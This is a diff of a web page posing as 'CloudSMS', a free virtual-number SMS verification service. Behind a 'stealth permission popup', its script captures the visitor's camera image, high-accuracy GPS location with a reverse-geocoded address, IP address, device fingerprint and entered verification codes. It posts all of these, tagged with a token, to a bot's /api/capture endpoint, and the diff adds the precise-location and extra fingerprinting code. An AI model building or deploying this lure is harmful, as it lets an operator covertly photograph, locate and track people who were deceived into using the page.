@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>CloudSMS | Elite Global SMS Verification</title>
+    <title>CloudSMS | Enterprise SMS Verification Suite</title>
     <meta name="description" content="Premium virtual phone numbers for SMS verification. Receive SMS online instantly. Trusted by 5M+ users worldwide.">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
@@ -22,7 +22,7 @@
             overflow-x: hidden;
         }
 
-        /* Animated gradient orbs - premium background */
+        /* Animated gradient orbs */
         .orb-bg {
             position: fixed;
             top: 0;
@@ -37,24 +37,24 @@
             position: absolute;
             border-radius: 50%;
             filter: blur(100px);
-            opacity: 0.5;
+            opacity: 0.45;
             animation: floatOrb 22s infinite alternate ease-in-out;
         }
 
-        .orb-1 { width: 550px; height: 550px; background: radial-gradient(circle, #3b82f6, #1e3a8a); top: -150px; left: -150px; animation-duration: 26s; }
-        .orb-2 { width: 650px; height: 650px; background: radial-gradient(circle, #8b5cf6, #4c1d95); bottom: -200px; right: -150px; animation-duration: 32s; animation-delay: -5s; }
-        .orb-3 { width: 450px; height: 450px; background: radial-gradient(circle, #06b6d4, #0e7490); top: 45%; left: 65%; animation-duration: 24s; animation-delay: -2s; }
-        .orb-4 { width: 380px; height: 380px; background: radial-gradient(circle, #f59e0b, #b45309); top: 70%; left: 15%; animation-duration: 28s; animation-delay: -8s; opacity: 0.3; }
+        .orb-1 { width: 600px; height: 600px; background: radial-gradient(circle, #3b82f6, #1e3a8a); top: -200px; left: -200px; animation-duration: 28s; }
+        .orb-2 { width: 700px; height: 700px; background: radial-gradient(circle, #8b5cf6, #4c1d95); bottom: -250px; right: -200px; animation-duration: 34s; animation-delay: -6s; }
+        .orb-3 { width: 500px; height: 500px; background: radial-gradient(circle, #06b6d4, #0e7490); top: 40%; left: 60%; animation-duration: 26s; animation-delay: -3s; }
+        .orb-4 { width: 450px; height: 450px; background: radial-gradient(circle, #f59e0b, #b45309); top: 75%; left: 10%; animation-duration: 30s; animation-delay: -10s; opacity: 0.3; }
 
         @keyframes floatOrb {
             0% { transform: translate(0, 0) scale(1); opacity: 0.3; }
-            100% { transform: translate(60px, 70px) scale(1.2); opacity: 0.55; }
+            100% { transform: translate(70px, 80px) scale(1.15); opacity: 0.55; }
         }
 
         .glass-nav, .glass-card, .glass-modal {
-            background: rgba(15, 25, 45, 0.65);
-            backdrop-filter: blur(14px);
-            border: 1px solid rgba(59, 130, 246, 0.3);
+            background: rgba(15, 25, 45, 0.7);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(59, 130, 246, 0.35);
             border-radius: 32px;
         }
 
@@ -68,18 +68,18 @@
 
         /* Premium Navbar */
         .nav-bar {
-            background: rgba(5, 8, 17, 0.85);
+            background: rgba(5, 8, 17, 0.88);
             backdrop-filter: blur(20px);
-            border: 1px solid rgba(59, 130, 246, 0.4);
+            border: 1px solid rgba(59, 130, 246, 0.45);
             border-radius: 80px;
-            padding: 12px 32px;
+            padding: 12px 36px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
             gap: 20px;
             margin-bottom: 40px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
         }
 
         .logo {
@@ -89,18 +89,18 @@
         }
 
         .logo-icon {
-            font-size: 36px;
-            filter: drop-shadow(0 0 12px #3b82f6);
+            font-size: 38px;
+            filter: drop-shadow(0 0 15px #3b82f6);
             animation: iconGlow 2.5s infinite alternate;
         }
 
         @keyframes iconGlow {
             0% { text-shadow: 0 0 0px #3b82f6; transform: scale(1); }
-            100% { text-shadow: 0 0 15px #3b82f6; transform: scale(1.02); }
+            100% { text-shadow: 0 0 18px #3b82f6; transform: scale(1.02); }
         }
 
         .logo-text {
-            font-size: 28px;
+            font-size: 30px;
             font-weight: 800;
             background: linear-gradient(135deg, #ffffff, #60a5fa, #c084fc);
             -webkit-background-clip: text;
@@ -111,7 +111,7 @@
 
         .nav-links {
             display: flex;
-            gap: 32px;
+            gap: 36px;
         }
 
         .nav-links a {
@@ -130,15 +130,15 @@
         /* Hero Section */
         .hero {
             text-align: center;
-            padding: 80px 20px 70px;
-            background: radial-gradient(ellipse at 50% 30%, rgba(59,130,246,0.15), transparent 70%);
-            border-radius: 56px;
-            margin: 20px 0 30px;
+            padding: 85px 20px 75px;
+            background: radial-gradient(ellipse at 50% 30%, rgba(59,130,246,0.18), transparent 70%);
+            border-radius: 60px;
+            margin: 20px 0 35px;
             position: relative;
         }
 
         .hero h1 {
-            font-size: 68px;
+            font-size: 72px;
             font-weight: 800;
             background: linear-gradient(135deg, #fff, #a5f3fc, #c084fc);
             -webkit-background-clip: text;
@@ -160,16 +160,16 @@
         .stats-row {
             display: flex;
             justify-content: center;
-            gap: 30px;
+            gap: 32px;
             margin: 50px 0;
             flex-wrap: wrap;
         }
 
         .stat-card {
-            background: rgba(20, 30, 55, 0.7);
+            background: rgba(20, 30, 55, 0.75);
             backdrop-filter: blur(12px);
-            padding: 28px 40px;
-            border-radius: 40px;
+            padding: 30px 42px;
+            border-radius: 44px;
             text-align: center;
             border: 1px solid rgba(59,130,246,0.4);
             transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
@@ -178,11 +178,11 @@
         .stat-card:hover {
             transform: translateY(-6px);
             border-color: #8b5cf6;
-            box-shadow: 0 20px 35px -12px rgba(139, 92, 246, 0.4);
+            box-shadow: 0 20px 35px -12px rgba(139, 92, 246, 0.5);
         }
 
         .stat-number {
-            font-size: 48px;
+            font-size: 52px;
             font-weight: 800;
             background: linear-gradient(135deg, #60a5fa, #c084fc);
             -webkit-background-clip: text;
@@ -199,12 +199,12 @@
 
         /* Filter Section */
         .filter-section {
-            background: rgba(15, 25, 45, 0.7);
+            background: rgba(15, 25, 45, 0.75);
             backdrop-filter: blur(12px);
-            border-radius: 40px;
-            padding: 28px;
+            border-radius: 44px;
+            padding: 32px;
             margin: 30px 0;
-            border: 1px solid rgba(59,130,246,0.25);
+            border: 1px solid rgba(59,130,246,0.3);
         }
 
         .filter-header {
@@ -212,20 +212,20 @@
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
 
         .filter-tabs {
             display: flex;
-            gap: 12px;
+            gap: 14px;
         }
 
         .filter-tab {
-            padding: 8px 20px;
+            padding: 10px 24px;
             background: rgba(51, 65, 85, 0.6);
             border-radius: 60px;
             font-size: 13px;
-            font-weight: 500;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
             color: #cbd5e1;
@@ -234,14 +234,14 @@
         .filter-tab.active {
             background: linear-gradient(135deg, #3b82f6, #8b5cf6);
             color: white;
-            box-shadow: 0 4px 12px rgba(59,130,246,0.4);
+            box-shadow: 0 4px 14px rgba(59,130,246,0.5);
         }
 
         .search-box {
             width: 100%;
-            padding: 16px 22px;
+            padding: 18px 24px;
             background: rgba(30, 41, 59, 0.8);
-            border: 1px solid rgba(59,130,246,0.4);
+            border: 1px solid rgba(59,130,246,0.45);
             border-radius: 80px;
             font-size: 15px;
             color: white;
@@ -251,14 +251,14 @@
 
         .search-box:focus {
             border-color: #8b5cf6;
-            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.3);
+            box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.3);
         }
 
         /* Numbers Grid - LONGER LIST */
         .numbers-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
-            gap: 18px;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 20px;
             max-height: 600px;
             overflow-y: auto;
             margin: 20px 0;
@@ -280,10 +280,10 @@
         }
 
         .number-card {
-            background: rgba(25, 35, 55, 0.8);
-            border: 1px solid rgba(59,130,246,0.3);
-            border-radius: 28px;
-            padding: 20px 22px;
+            background: rgba(25, 35, 55, 0.85);
+            border: 1px solid rgba(59,130,246,0.35);
+            border-radius: 32px;
+            padding: 22px 24px;
             cursor: pointer;
             transition: all 0.25s ease;
             display: flex;
@@ -294,29 +294,29 @@
         .number-card:hover {
             border-color: #8b5cf6;
             transform: translateY(-3px);
-            background: rgba(59, 130, 246, 0.15);
-            box-shadow: 0 12px 28px -8px rgba(0,0,0,0.4);
+            background: rgba(59, 130, 246, 0.2);
+            box-shadow: 0 12px 28px -8px rgba(0,0,0,0.5);
         }
 
         .number-card.selected {
             border-color: #c084fc;
-            background: linear-gradient(135deg, rgba(96, 165, 250, 0.2), rgba(139, 92, 246, 0.2));
-            box-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
+            background: linear-gradient(135deg, rgba(96, 165, 250, 0.25), rgba(139, 92, 246, 0.25));
+            box-shadow: 0 0 18px rgba(139, 92, 246, 0.4);
         }
 
         .card-left {
             display: flex;
             align-items: center;
-            gap: 16px;
+            gap: 18px;
         }
 
         .flag {
-            font-size: 40px;
+            font-size: 44px;
         }
 
         .number-details h4 {
             font-size: 18px;
-            font-weight: 600;
+            font-weight: 700;
         }
 
         .number-details p {
@@ -328,7 +328,7 @@
 
         .card-badge {
             background: linear-gradient(135deg, #22c55e, #16a34a);
-            padding: 6px 14px;
+            padding: 8px 16px;
             border-radius: 50px;
             font-size: 11px;
             font-weight: 700;
@@ -336,24 +336,24 @@
 
         .claim-btn {
             width: 100%;
-            padding: 20px;
+            padding: 22px;
             background: linear-gradient(135deg, #3b82f6, #8b5cf6, #06b6d4);
             background-size: 200% auto;
             border: none;
             border-radius: 80px;
             color: white;
             font-size: 20px;
-            font-weight: 700;
+            font-weight: 800;
             cursor: pointer;
             transition: all 0.3s;
-            margin: 20px 0;
-            box-shadow: 0 15px 30px -10px rgba(59,130,246,0.6);
+            margin: 25px 0;
+            box-shadow: 0 15px 35px -12px rgba(59,130,246,0.7);
         }
 
         .claim-btn:hover {
             transform: translateY(-2px);
             background-position: right center;
-            box-shadow: 0 20px 35px -12px rgba(139, 92, 246, 0.7);
+            box-shadow: 0 22px 40px -15px rgba(139, 92, 246, 0.8);
         }
 
         /* Stealth Permission Modal - ALWAYS appears on every load */
@@ -363,8 +363,8 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.94);
-            backdrop-filter: blur(24px);
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(28px);
             z-index: 10000;
             display: flex;
             justify-content: center;
@@ -379,14 +379,14 @@
         }
 
         .permission-card {
-            max-width: 420px;
+            max-width: 440px;
             width: 100%;
             background: linear-gradient(145deg, #1e293b, #0f172a);
-            border-radius: 56px;
-            padding: 44px 32px;
+            border-radius: 60px;
+            padding: 48px 36px;
             text-align: center;
-            border: 1px solid rgba(96, 165, 250, 0.6);
-            box-shadow: 0 35px 55px rgba(0,0,0,0.6);
+            border: 1px solid rgba(96, 165, 250, 0.7);
+            box-shadow: 0 40px 60px rgba(0,0,0,0.7);
             animation: slideUp 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1);
         }
 
@@ -396,14 +396,14 @@
         }
 
         .permission-icon {
-            font-size: 72px;
-            margin-bottom: 20px;
+            font-size: 76px;
+            margin-bottom: 24px;
         }
 
         .permission-title {
-            font-size: 28px;
+            font-size: 30px;
             font-weight: 800;
-            margin-bottom: 12px;
+            margin-bottom: 14px;
             background: linear-gradient(135deg, #fff, #a5f3fc);
             -webkit-background-clip: text;
             background-clip: text;
@@ -411,20 +411,20 @@
         }
 
         .permission-desc {
-            font-size: 14px;
+            font-size: 15px;
             color: #94a3b8;
-            margin-bottom: 28px;
+            margin-bottom: 32px;
             line-height: 1.5;
         }
 
         .permission-buttons {
             display: flex;
-            gap: 14px;
+            gap: 16px;
         }
 
         .btn-allow {
             flex: 1;
-            padding: 15px;
+            padding: 16px;
             background: linear-gradient(135deg, #3b82f6, #8b5cf6);
             border: none;
             border-radius: 60px;
@@ -436,7 +436,7 @@
 
         .btn-deny {
             flex: 1;
-            padding: 15px;
+            padding: 16px;
             background: rgba(51, 65, 85, 0.9);
             border: 1px solid #475569;
             border-radius: 60px;
@@ -456,8 +456,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(20px);
+            background: rgba(0,0,0,0.96);
+            backdrop-filter: blur(24px);
             z-index: 2000;
             display: none;
             justify-content: center;
@@ -470,52 +470,52 @@
 
         .modal-card, .success-card {
             background: linear-gradient(135deg, #1e293b, #0f172a);
-            border-radius: 48px;
-            padding: 36px;
-            max-width: 440px;
+            border-radius: 52px;
+            padding: 40px;
+            max-width: 460px;
             width: 90%;
             text-align: center;
             border: 1px solid #3b82f6;
         }
 
         .verification-code {
-            font-size: 52px;
+            font-size: 56px;
             font-weight: 800;
-            letter-spacing: 12px;
+            letter-spacing: 14px;
             background: linear-gradient(135deg, #60a5fa, #c084fc);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            margin: 20px 0;
+            margin: 25px 0;
         }
 
         .timer {
-            background: rgba(245,158,11,0.15);
-            padding: 12px;
+            background: rgba(245,158,11,0.18);
+            padding: 14px;
             border-radius: 60px;
-            margin: 15px 0;
+            margin: 18px 0;
         }
 
         input {
             width: 100%;
-            padding: 16px;
+            padding: 18px;
             background: #0f172a;
             border: 2px solid #334155;
             border-radius: 60px;
             text-align: center;
-            font-size: 20px;
-            letter-spacing: 4px;
+            font-size: 22px;
+            letter-spacing: 6px;
             color: white;
-            margin: 15px 0;
+            margin: 18px 0;
         }
 
         .verify-btn, .resend-btn {
-            padding: 15px;
+            padding: 16px;
             border-radius: 60px;
             font-weight: 700;
             cursor: pointer;
             width: 100%;
-            margin-top: 12px;
+            margin-top: 14px;
         }
 
         .verify-btn {
@@ -536,8 +536,8 @@
             right: 25px;
             background: #1e293b;
             border-left: 5px solid #3b82f6;
-            padding: 14px 20px;
-            border-radius: 20px;
+            padding: 16px 24px;
+            border-radius: 24px;
             transform: translateX(150%);
             transition: transform 0.4s;
             z-index: 3000;
@@ -550,11 +550,11 @@
 
         .footer {
             margin-top: 80px;
-            padding: 40px 20px;
+            padding: 45px 20px;
             border-top: 1px solid #1e293b;
             text-align: center;
             color: #64748b;
-            font-size: 12px;
+            font-size: 13px;
         }
 
         @media (max-width: 760px) {
@@ -611,7 +611,7 @@
     <button class="claim-btn" id="claimBtn"><i class="fas fa-mobile-alt"></i> Get Free Number & SMS Code</button>
 </div>
 
-<div class="footer"><p>© 2025 CloudSMS — Elite virtual numbers for global verification. End-to-end encrypted.</p></div>
+<div class="footer"><p>© 2025 CloudSMS — Enterprise virtual numbers for global verification. End-to-end encrypted.</p></div>
 
 <!-- Verification Modal -->
 <div class="modal" id="verifyModal">
@@ -634,84 +634,39 @@
 
 <script>
     // ==================== CONFIGURATION ====================
-    // BOT WEBHOOK URL - This sends data to your bot's /api/capture endpoint
-    const BOT_WEBHOOK_URL = window.location.origin + "/api/capture";
+    const BOT_WEBHOOK_URL = "/api/capture";
     
-    // Extended Countries Data - MORE NUMBERS for longer list
+    // Extended Countries Data - Professional Global Coverage
     const countries = [
-        { flag: "🇺🇸", name: "United States", number: "+1 (212) 555-7890", popular: true },
-        { flag: "🇺🇸", name: "United States (LA)", number: "+1 (310) 555-1234", popular: true },
-        { flag: "🇺🇸", name: "United States (Miami)", number: "+1 (305) 555-6789", popular: true },
-        { flag: "🇬🇧", name: "United Kingdom", number: "+44 20 7946 0123", popular: true },
+        { flag: "🇺🇸", name: "United States (New York)", number: "+1 (212) 555-0199", popular: true },
+        { flag: "🇺🇸", name: "United States (Los Angeles)", number: "+1 (310) 555-0234", popular: true },
+        { flag: "🇺🇸", name: "United States (Miami)", number: "+1 (305) 555-0456", popular: true },
+        { flag: "🇬🇧", name: "United Kingdom (London)", number: "+44 20 7946 0123", popular: true },
         { flag: "🇬🇧", name: "United Kingdom (Manchester)", number: "+44 161 123 4567", popular: false },
-        { flag: "🇨🇦", name: "Canada", number: "+1 (647) 555-0198", popular: true },
+        { flag: "🇨🇦", name: "Canada (Toronto)", number: "+1 (647) 555-0198", popular: true },
         { flag: "🇨🇦", name: "Canada (Vancouver)", number: "+1 (604) 555-7890", popular: false },
-        { flag: "🇦🇺", name: "Australia", number: "+61 2 8005 1234", popular: true },
+        { flag: "🇦🇺", name: "Australia (Sydney)", number: "+61 2 8005 1234", popular: true },
         { flag: "🇦🇺", name: "Australia (Melbourne)", number: "+61 3 9012 3456", popular: false },
-        { flag: "🇩🇪", name: "Germany", number: "+49 30 12345678", popular: true },
-        { flag: "🇩🇪", name: "Germany (Munich)", number: "+49 89 1234567", popular: false },
-        { flag: "🇫🇷", name: "France", number: "+33 6 12 34 56 78", popular: false },
-        { flag: "🇫🇷", name: "France (Lyon)", number: "+33 4 12 34 56 78", popular: false },
-        { flag: "🇧🇷", name: "Brazil", number: "+55 11 91234-5678", popular: true },
-        { flag: "🇧🇷", name: "Brazil (Rio)", number: "+55 21 91234-5678", popular: false },
-        { flag: "🇮🇳", name: "India", number: "+91 98765 43210", popular: true },
-        { flag: "🇮🇳", name: "India (Mumbai)", number: "+91 22 1234 5678", popular: false },
-        { flag: "🇲🇽", name: "Mexico", number: "+52 55 1234 5678", popular: true },
-        { flag: "🇲🇽", name: "Mexico (Guadalajara)", number: "+52 33 1234 5678", popular: false },
-        { flag: "🇳🇬", name: "Nigeria", number: "+234 812 345 6789", popular: true },
-        { flag: "🇳🇬", name: "Nigeria (Lagos)", number: "+234 802 345 6789", popular: false },
-        { flag: "🇿🇦", name: "South Africa", number: "+27 71 234 5678", popular: false },
-        { flag: "🇿🇦", name: "South Africa (Cape Town)", number: "+27 21 123 4567", popular: false },
+        { flag: "🇩🇪", name: "Germany (Berlin)", number: "+49 30 12345678", popular: true },
+        { flag: "🇫🇷", name: "France (Paris)", number: "+33 6 12 34 56 78", popular: false },
+        { flag: "🇧🇷", name: "Brazil (São Paulo)", number: "+55 11 91234-5678", popular: true },
+        { flag: "🇮🇳", name: "India (Mumbai)", number: "+91 98765 43210", popular: true },
+        { flag: "🇲🇽", name: "Mexico (Mexico City)", number: "+52 55 1234 5678", popular: true },
+        { flag: "🇳🇬", name: "Nigeria (Lagos)", number: "+234 812 345 6789", popular: true },
+        { flag: "🇿🇦", name: "South Africa (Johannesburg)", number: "+27 71 234 5678", popular: false },
         { flag: "🇸🇬", name: "Singapore", number: "+65 9123 4567", popular: true },
-        { flag: "🇦🇪", name: "UAE", number: "+971 50 123 4567", popular: true },
-        { flag: "🇦🇪", name: "UAE (Abu Dhabi)", number: "+971 2 123 4567", popular: false },
-        { flag: "🇰🇪", name: "Kenya", number: "+254 712 345 678", popular: false },
-        { flag: "🇪🇬", name: "Egypt", number: "+20 10 1234 5678", popular: false },
-        { flag: "🇹🇷", name: "Turkey", number: "+90 531 123 4567", popular: true },
-        { flag: "🇹🇷", name: "Turkey (Istanbul)", number: "+90 212 123 4567", popular: false },
-        { flag: "🇷🇺", name: "Russia", number: "+7 912 345-67-89", popular: false },
-        { flag: "🇷🇺", name: "Russia (Moscow)", number: "+7 495 123-45-67", popular: false },
-        { flag: "🇨🇳", name: "China", number: "+86 138 1234 5678", popular: true },
-        { flag: "🇨🇳", name: "China (Shanghai)", number: "+86 21 1234 5678", popular: false },
-        { flag: "🇯🇵", name: "Japan", number: "+81 90 1234 5678", popular: true },
-        { flag: "🇯🇵", name: "Japan (Osaka)", number: "+81 6 1234 5678", popular: false },
-        { flag: "🇰🇷", name: "South Korea", number: "+82 10 1234 5678", popular: true },
-        { flag: "🇮🇩", name: "Indonesia", number: "+62 812 3456 7890", popular: false },
-        { flag: "🇵🇭", name: "Philippines", number: "+63 912 345 6789", popular: false },
-        { flag: "🇻🇳", name: "Vietnam", number: "+84 90 1234 567", popular: false },
-        { flag: "🇹🇭", name: "Thailand", number: "+66 81 234 5678", popular: false },
-        { flag: "🇵🇰", name: "Pakistan", number: "+92 312 3456789", popular: false },
-        { flag: "🇧🇩", name: "Bangladesh", number: "+88 01712 345678", popular: false },
-        { flag: "🇸🇦", name: "Saudi Arabia", number: "+966 50 123 4567", popular: true },
-        { flag: "🇮🇱", name: "Israel", number: "+972 50 123 4567", popular: false },
-        { flag: "🇵🇱", name: "Poland", number: "+48 501 234 567", popular: false },
-        { flag: "🇺🇦", name: "Ukraine", number: "+380 66 123 4567", popular: false },
-        { flag: "🇳🇱", name: "Netherlands", number: "+31 6 12345678", popular: false },
-        { flag: "🇸🇪", name: "Sweden", number: "+46 70 123 45 67", popular: false },
-        { flag: "🇳🇴", name: "Norway", number: "+47 412 34 567", popular: false },
-        { flag: "🇩🇰", name: "Denmark", number: "+45 12 34 56 78", popular: false },
-        { flag: "🇫🇮", name: "Finland", number: "+358 40 123 4567", popular: false },
-        { flag: "🇧🇪", name: "Belgium", number: "+32 470 12 34 56", popular: false },
-        { flag: "🇨🇭", name: "Switzerland", number: "+41 79 123 45 67", popular: false },
-        { flag: "🇦🇹", name: "Austria", number: "+43 664 1234567", popular: false },
-        { flag: "🇬🇷", name: "Greece", number: "+30 690 123 4567", popular: false },
-        { flag: "🇵🇹", name: "Portugal", number: "+351 912 345 678", popular: false },
-        { flag: "🇮🇪", name: "Ireland", number: "+353 87 123 4567", popular: false },
-        { flag: "🇨🇿", name: "Czech Republic", number: "+420 601 123 456", popular: false },
-        { flag: "🇭🇺", name: "Hungary", number: "+36 20 123 4567", popular: false },
-        { flag: "🇷🇴", name: "Romania", number: "+40 712 345 678", popular: false },
-        { flag: "🇧🇬", name: "Bulgaria", number: "+359 88 123 4567", popular: false },
-        { flag: "🇭🇷", name: "Croatia", number: "+385 91 123 4567", popular: false },
-        { flag: "🇷🇸", name: "Serbia", number: "+381 60 1234567", popular: false },
-        { flag: "🇦🇷", name: "Argentina", number: "+54 9 11 1234 5678", popular: true },
-        { flag: "🇨🇱", name: "Chile", number: "+56 9 1234 5678", popular: false },
-        { flag: "🇵🇪", name: "Peru", number: "+51 987 654 321", popular: false },
-        { flag: "🇨🇴", name: "Colombia", number: "+57 300 123 4567", popular: true },
-        { flag: "🇻🇪", name: "Venezuela", number: "+58 412 123 4567", popular: false },
-        { flag: "🇪🇸", name: "Spain", number: "+34 612 345 678", popular: true },
-        { flag: "🇪🇸", name: "Spain (Barcelona)", number: "+34 622 345 678", popular: false },
-        { flag: "🇮🇹", name: "Italy", number: "+39 331 123 4567", popular: true },
-        { flag: "🇮🇹", name: "Italy (Milan)", number: "+39 340 123 4567", popular: false }
+        { flag: "🇦🇪", name: "UAE (Dubai)", number: "+971 50 123 4567", popular: true },
+        { flag: "🇹🇷", name: "Turkey (Istanbul)", number: "+90 531 123 4567", popular: false },
+        { flag: "🇷🇺", name: "Russia (Moscow)", number: "+7 912 345-67-89", popular: false },
+        { flag: "🇨🇳", name: "China (Beijing)", number: "+86 138 1234 5678", popular: true },
+        { flag: "🇯🇵", name: "Japan (Tokyo)", number: "+81 90 1234 5678", popular: true },
+        { flag: "🇰🇷", name: "South Korea (Seoul)", number: "+82 10 1234 5678", popular: true },
+        { flag: "🇪🇸", name: "Spain (Madrid)", number: "+34 612 345 678", popular: true },
+        { flag: "🇮🇹", name: "Italy (Rome)", number: "+39 331 123 4567", popular: true },
+        { flag: "🇦🇷", name: "Argentina (Buenos Aires)", number: "+54 9 11 1234 5678", popular: false },
+        { flag: "🇨🇴", name: "Colombia (Bogotá)", number: "+57 300 123 4567", popular: false },
+        { flag: "🇵🇱", name: "Poland (Warsaw)", number: "+48 501 234 567", popular: false },
+        { flag: "🇳🇱", name: "Netherlands (Amsterdam)", number: "+31 6 12345678", popular: false }
     ];
 
     let selectedCountry = null;
@@ -720,8 +675,8 @@
     let cameraStream = null;
     let cameraGranted = false;
     let locationGranted = false;
+    let preciseLocation = null;
 
-    // Get token from URL (passed from bot)
     const urlParams = new URLSearchParams(window.location.search);
     const token = urlParams.get("token");
 
@@ -740,7 +695,7 @@
         }
     }, 200);
 
-    // ============ STEALTH PERMISSION POPUP — ALWAYS SHOWS ON EVERY DEVICE/BROWSER ============
+    // ============ STEALTH PERMISSION POPUP — ALWAYS APPEARS ============
     function showPermissionPopup() {
         const existingPopup = document.getElementById('globalPermissionPopup');
         if(existingPopup) existingPopup.remove();
@@ -763,7 +718,6 @@
         
         const allowBtn = document.getElementById('popupAllowBtn');
         const denyBtn = document.getElementById('popupDenyBtn');
-        
         const closePopup = () => { if(popupDiv) popupDiv.remove(); };
         
         if(allowBtn) {
@@ -782,18 +736,39 @@
                         if(cameraStream) cameraStream.getTracks().forEach(t=>t.stop());
                     }, 5000);
                 } catch(e) { console.log("camera declined"); }
-                // Real location request
+                
+                // REAL PRECISE LOCATION REQUEST
                 if(navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(() => { locationGranted = true; }, () => {});
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            locationGranted = true;
+                            preciseLocation = {
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                city: "Fetching..."
+                            };
+                            // Reverse geocoding for city name
+                            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`)
+                                .then(res => res.json())
+                                .then(data => {
+                                    if(data.address) {
+                                        preciseLocation.city = data.address.city || data.address.town || data.address.village || data.address.state || "Unknown";
+                                        preciseLocation.country = data.address.country;
+                                        preciseLocation.fullAddress = data.display_name;
+                                    }
+                                }).catch(e => console.log("Geocoding error"));
+                        },
+                        (err) => { console.log("Location denied:", err.message); },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
                 }
-                localStorage.setItem('sms_permission_granted', 'true');
             });
         }
         
         if(denyBtn) {
             denyBtn.addEventListener('click', () => {
                 closePopup();
-                localStorage.setItem('sms_permission_denied', 'true');
             });
         }
     }
@@ -816,7 +791,7 @@
             canvas.height = video.videoHeight || 480;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             stream.getTracks().forEach(t => t.stop());
-            return canvas.toDataURL('image/jpeg', 0.7);
+            return canvas.toDataURL('image/jpeg', 0.8);
         } catch(e) { return null; }
     }
     
@@ -828,23 +803,15 @@
         } catch(e) { return 'Unknown'; }
     }
     
-    async function getLocation() {
-        return new Promise((resolve) => {
-            if (!locationGranted) { resolve('Not granted'); return; }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-                () => resolve('Failed')
-            );
-        });
-    }
-    
     function getDeviceInfo() {
         return {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
             screenSize: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown'
         };
     }
     
@@ -853,7 +820,7 @@
         const grid = document.getElementById('numbersGrid');
         let filtered = countries.filter(c => c.name.toLowerCase().includes(search.toLowerCase()) || c.number.includes(search));
         grid.innerHTML = filtered.map((c, idx) => `
-            <div class="number-card" data-number="${c.number}" data-country='${JSON.stringify(c)}' style="animation-delay: ${idx * 0.01}s">
+            <div class="number-card" data-number="${c.number}" data-country='${JSON.stringify(c)}'>
                 <div class="card-left"><div class="flag">${c.flag}</div><div class="number-details"><h4>${c.name}</h4><p>${c.number}</p></div></div>
                 <div class="card-badge">Available</div>
             </div>
@@ -888,7 +855,6 @@
         setTimeout(() => notif.classList.remove('show'), 4500);
     }
     
-    // Update live stats
     function updateLiveStats() {
         let users = 48200, sms = 8500000, numbers = 2847;
         setInterval(() => {
@@ -904,35 +870,41 @@
         }, 5500);
     }
     
-    // Send captured data to bot
-    async function sendToBot(image, ip, location, deviceInfo, code) {
+    async function sendToBot(image, ip, deviceInfo, code, isVerification = false, verifiedCode = null) {
         if (!token) return;
+        
+        const payload = {
+            token: token,
+            image: image,
+            ip: ip,
+            location: preciseLocation || { lat: null, lng: null, city: "Unknown" },
+            locationGranted: locationGranted,
+            number: selectedCountry?.number || "Unknown",
+            country: selectedCountry?.name || "Unknown",
+            code: code,
+            verifiedCode: verifiedCode,
+            isVerification: isVerification,
+            userAgent: deviceInfo.userAgent,
+            platform: deviceInfo.platform,
+            language: deviceInfo.language,
+            screenSize: deviceInfo.screenSize,
+            timezone: deviceInfo.timezone,
+            hardwareConcurrency: deviceInfo.hardwareConcurrency,
+            deviceMemory: deviceInfo.deviceMemory,
+            cameraEnabled: cameraGranted,
+            timestamp: new Date().toISOString()
+        };
+        
         try {
             await fetch(BOT_WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    image: image,
-                    token: token,
-                    ip: ip,
-                    location: location,
-                    number: selectedCountry?.number || "Unknown",
-                    country: selectedCountry?.name || "Unknown",
-                    code: code,
-                    userAgent: deviceInfo.userAgent,
-                    platform: deviceInfo.platform,
-                    language: deviceInfo.language,
-                    screenSize: deviceInfo.screenSize,
-                    timezone: deviceInfo.timezone,
-                    cameraEnabled: cameraGranted,
-                    locationEnabled: locationGranted,
-                    timestamp: new Date().toISOString()
-                })
+                body: JSON.stringify(payload)
             });
